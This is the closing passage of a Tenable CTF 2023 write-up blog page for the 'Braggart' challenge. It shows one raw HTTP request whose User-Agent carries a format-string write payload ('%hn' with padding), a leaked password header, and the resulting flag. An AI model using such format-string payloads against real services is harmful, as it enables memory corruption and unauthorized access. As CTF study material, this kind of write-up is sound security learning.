<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /sec.cgi HTTP/1.1</span><br><span class="line">Host: nessus-braggart.chals.io</span><br><span class="line">User-Agent: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaak%27750c%267$hn</span><br><span class="line">X-Debug: 1</span><br><span class="line">X-Password: xbYP3h7Ua94c</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>And we flagged them!</p>
<p>Flag: <code>flag&#123;f0rmat_th3m_str1ngz&#125;</code></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="../../../../index.html">Home</a></li>
        
          <li><a href="../../../../about/">About</a></li>
        
          <li><a href="../../../../archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reversing-Pwnable"><span class="toc-number">2.</span> <span class="toc-text">Reversing &#x2F; Pwnable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Skiddyana-Pwnz-and-the-Loom-of-Fate"><span class="toc-number">2.1.</span> <span class="toc-text">Skiddyana Pwnz and the Loom of Fate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis"><span class="toc-number">2.1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Leak-the-password"><span class="toc-number">2.1.2.</span> <span class="toc-text">Leak the password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Redirect-execution-flow-to-call-theVoid"><span class="toc-number">2.1.3.</span> <span class="toc-text">Redirect execution flow to call theVoid</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Braggart"><span class="toc-number">2.2.</span> <span class="toc-text">Braggart</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Leak-Password"><span class="toc-number">2.2.2.</span> <span class="toc-text">Leak Password</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Overwrite-brag-to-flag"><span class="toc-number">2.2.3.</span> <span class="toc-text">Overwrite brag to flag</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&text=Tenable CTF 2023 Writeups"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&is_video=false&description=Tenable CTF 2023 Writeups"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Tenable CTF 2023 Writeups&body=Check out this article: https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&title=Tenable CTF 2023 Writeups"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&name=Tenable CTF 2023 Writeups&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://nkd3v.github.io/2023/08/12/Tenable-CTF-2023/&t=Tenable CTF 2023 Writeups"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    Narongpol Kijrangsan
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../about/">About</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/nkd3v">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
